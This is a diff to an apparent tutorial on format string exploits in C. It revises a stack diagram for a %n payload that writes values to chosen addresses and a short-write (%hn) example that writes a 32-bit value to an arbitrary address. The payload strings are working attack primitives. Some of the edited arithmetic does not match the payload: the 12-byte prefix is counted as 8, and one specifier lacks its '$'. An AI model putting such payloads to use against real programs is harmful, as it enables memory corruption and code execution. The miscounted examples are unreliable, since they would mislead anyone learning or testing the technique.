@@ -42,21 +42,21 @@ But, what if no argument exists?   **OVERFLOW**
 |         |                                     ebp + 24
 |         |
 |         | char fmt_str2[50] = 
-|         |         "\x04\x80\x04\x08AAAA\x08\x80\x04\x08%x%9x%x%n%17x%n"
-|         |          |_________________________________________| |   | |
-|         |                               |                      |   | |
-|         |                               V                      |   | |
-|         |          number of characters so far (4+4+4+1+9+1=23)|   | |
-|         |                                                      V   | |
-|         |                                          write 0x17 to   | |
-|         |                                             0x08048004   | |
-|         |                                                          V |
-|         |                                               read 4 bytes |
-|         |                                                       AAAA |
-|         |                                  print it as 17 chars long |
-|         |                                                            V
-|         |                                                write 0x28 to
-|         |                                                   0x08048008
+|         |         "\x04\x80\x04\x08AAAA\x08\x80\x04\x08%8x%9x%10x%n%17x%n"
+|         |          |____________________________________________| | | |
+|         |                                |                        | | |
+|         |                                V                        | | |
+|         |          number of characters so far (4+4+4+8+9+10=39)  | | |
+|         |                                                         V | |
+|         |                                             write 0x27 to | |
+|         |                                                0x08048004 | |
+|         |                                                           V |
+|         |                                                read 4 bytes |
+|         |                                                      "AAAA" |
+|         |                                   print it as 17 chars long |
+|         |                                                             V
+|         |                                                 write 0x38 to
+|         |                                                    0x08048008
 |         |
 |_fmt_str_| <- address of format string, ebp + 8, as first argument of printf.
 |___ret___|
@@ -87,11 +87,11 @@ On IA-32 platform, 2nd argument is located 4 bytes after 1st one, but if we use 
 #### Short Writes
 Because the bigest short int is `0xFFFF`(65535), means that it could be used to construct any number by `printf` with `%hn`, just split a number into two half.
 ```c
-//0xbfff0010
+//0x0010bfff
 //bfff(16) == 49151(10)
-printf("\x06\x01\x01\x01\x04\x01\x01\x01%49143x%5$hn%16401x%6hn");
-//      |           8 + 49143 = bfff          |     |0x10010-0xbfff|
-// write 0xbfff0010 to location 0x01010104
+printf("\x06\x01\x01\x01JUNK\x04\x01\x01\x01%49143x%5$hn%16401x%6hn");
+//      |           8 + 49143 = 0xbfff          |     |0x10010-0xbfff|
+// write 0x0010bfff to location 0x01010104
 ```
 
 #### .ctors and .dtors
